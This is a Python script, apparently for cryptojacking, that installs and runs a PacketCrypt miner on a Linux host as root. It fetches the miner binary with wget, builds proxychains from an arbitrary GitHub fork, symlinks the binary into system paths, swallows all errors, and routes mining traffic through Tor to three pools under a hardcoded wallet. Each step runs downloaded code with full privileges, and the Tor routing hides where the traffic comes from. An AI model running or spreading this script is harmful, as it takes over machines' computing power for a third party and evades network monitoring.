__author__ = 'root'
import time
import os, sys
import multiprocessing

useproxy = 0
os.system('chmod 777 ' + __file__)
program = 'packetcrypt-linux-amd64'
os.system('pkill ' + program)
cores = multiprocessing.cpu_count() - 1
if cores <= 0:
    cores = 1
os.system('sysctl -w vm.nr_hugepages=$((`grep -c ^processor /proc/cpuinfo` * 3))')

try:
    os.system('apt-get update -y')
    os.system('apt-get install -y gcc make tor python3 python3-dev')
    os.system('rm -rf proxychains-ng')
    os.system('git clone https://github.com/ts6aud5vkg/proxychains-ng.git')
    os.chdir('proxychains-ng')
    os.system('make')
    os.system('make install')
    os.system('make install-config')
    if os.path.isfile('/usr/local/bin/' + program) == False:
        os.system('wget https://www.pkt.world/ext/' + program)            
        os.system('chmod 777 ' + program)
        workingdir = os.getcwd()
        os.system('ln -s -f ' + workingdir + '/' + program + ' ' +'/usr/local/bin/' + program)
        os.system('ln -s -f ' + workingdir + '/' + program + ' ' + '/usr/bin/' + program)
        time.sleep (2)
except:
    pass
os.system('tor &')
time.sleep(60)
os.system ('proxychains4 ' + program + ' ann -p pkt1qmmecdztm2ff4fvul0y2u7nfrrh3pdy0x6p6vdk http://pool.pkt.world http://pool.pktpool.io http://pool.pkteer.com ' )